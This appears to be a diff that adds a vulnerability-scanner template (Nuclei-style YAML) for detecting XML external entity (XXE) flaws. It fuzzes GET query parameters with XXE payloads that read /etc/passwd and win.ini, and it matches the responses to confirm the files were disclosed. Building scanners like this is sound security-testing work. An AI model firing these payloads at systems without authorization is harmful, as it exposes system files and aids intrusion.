@@ -1,0 +1,54 @@
+id: generic-xxe
+
+info:
+  name: Generic XML external entity (XXE)
+  author: pwnhxl
+  severity: medium
+  reference:
+    - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  metadata:
+    max-request: 2
+  tags: dast,xxe
+
+variables:
+  rletter: "{{rand_base(6,'abc')}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      xxe:
+        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini"> ]><x>&{{rletter}};</x>'
+        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>'
+
+    fuzzing:
+      - part: query
+        keys-regex:
+          - "(.*?)xml(.*?)"
+        fuzz:
+          - "{{xxe}}"
+
+      - part: query
+        values:
+          - "(<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>"
+        fuzz:
+          - "{{xxe}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
+# digest: 490a0046304402200765457e7ce86f2875c9b0446d1e4d4a3f035e95c8cb70d2c685bed047e1883c022000fb0dbfce1acce174129de4808904972d457aae4cc27dd68672d8e5a14d49b1:922c64590222798bb761d5b6d8e72950
